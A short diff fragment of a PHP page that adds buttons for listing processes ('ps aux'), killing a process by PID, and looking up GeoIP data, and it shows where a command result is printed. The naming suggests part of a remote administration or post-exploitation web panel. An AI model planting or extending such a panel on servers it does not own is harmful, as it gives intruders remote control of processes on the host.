+        <button class="exp-btn purple" type="submit" name="post_act" value="proc_list"><span class="icon">⚙</span><span>PROCESS LIST<br><small style="opacity:.6">ps aux</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="proc_kill"><span class="icon">💀</span><span>PROCESS KILL<br><small style="opacity:.6">arg1=PID</small></span></button>
+        <button class="exp-btn cyan" type="submit" name="post_act" value="geoip"><span class="icon">🌍</span><span>GEOIP LOOKUP<br><small style="opacity:.6">arg1=IP (opt)</small></span></button>
+      </div>
+    </form>
+    <?php if ($post_result !== ''): ?><div class="msg term-purple" style="margin-top:12px"><?=h($post_result)?></div><?php endif; ?>
   </div>
 </div>
 
